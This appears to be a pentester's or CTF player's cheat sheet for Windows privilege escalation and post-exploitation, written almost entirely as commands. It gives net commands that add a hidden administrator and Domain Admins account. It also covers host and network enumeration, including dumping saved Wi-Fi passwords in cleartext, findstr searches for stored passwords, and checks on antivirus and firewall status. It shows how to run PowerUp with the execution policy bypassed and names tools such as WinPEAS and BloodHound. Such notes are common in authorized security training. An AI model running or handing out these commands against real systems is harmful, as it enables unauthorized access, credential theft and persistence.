#### Creating an account
```
- net user name Username12345678* /add /Y
- net localgroup administrators name /add
- net localgroup "Remote Desktop Users" name /add #access RDP
- net localgroup "Backup Operators" name /add #full acceess to files
- net group "Domain Admins" name /add /domain
- net user name /ACTIVE:YES /domain` #enables domain user account
```

#### System Enum
```
- systeminfo
- systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
- hostname
- wmic qfe
- wmic qfe get Caption,Description,HotFixID,InstalledOn
- wmic logicaldisk get caption,description,providername
- whoami /priv
- whoami /groups
- net user babis
- net localgroup
- net localgroup administrators
- C:\Program Files
  - search for vulns in all installed software
```

#### Network Enum
```
- ipconfig /all
- netstat -ano #listening ports
- route print #routing table
- arp -a
- Netsh wlan show profile
- Netsh wlan show profile <SSID> key=clear

```

#### Passwords
```
- findstr /si password *.txt
- findstr /si password *.txt *.config *.ini
```

#### AV Enum
```
- sc query windefend
- sc queryex type= service
- netsh advfirewall firewall dump
- netsh firewall show state
- netsh firewall show config
```
#### Tools
```
- PowerUp
  - powershell -ep bypass
  - import powerup
  - ..\PowerUp.ps1
  - then:
  - invoke-AllChecks
  - let this run
- WinPEAS
- Windows-exploit-suggester.py
- Bloodhound
- crackmapexec/netexec
- PEASS-ng
```

#### Sites:
- [LOLBAS](https://lolbas-project.github.io/#)
  - GTFObins of windows
- [hacktricks](https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [Absolomb](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

